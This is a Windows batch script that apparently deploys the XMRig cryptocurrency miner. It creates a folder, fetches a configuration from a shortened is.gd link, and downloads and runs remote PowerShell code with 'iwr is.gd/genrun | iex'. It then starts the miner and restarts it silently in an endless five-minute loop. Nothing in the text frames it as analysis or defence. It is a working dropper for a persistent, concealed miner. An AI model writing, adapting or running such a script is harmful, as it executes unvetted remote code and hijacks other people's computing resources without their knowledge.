@echo off
setlocal
if not exist "C:\タリタニア" mkdir C:\タリタニア

:listener
curl -L -s -o "C:\タリタニア\config.json" ^
  "is.gd/genrun_config"

if not exist "C:\タリタニア\xmrig.exe" (
    powershell -NoProfile -Command "iwr is.gd/genrun | iex"
)

tasklist /FI "IMAGENAME eq xmrig.exe" 2>NUL | find /I "xmrig.exe" >NUL
if errorlevel 1 (
    start "" "C:\タリタニア\xmrig.exe"
)

cls
timeout /t 300 /nobreak >nul
goto listener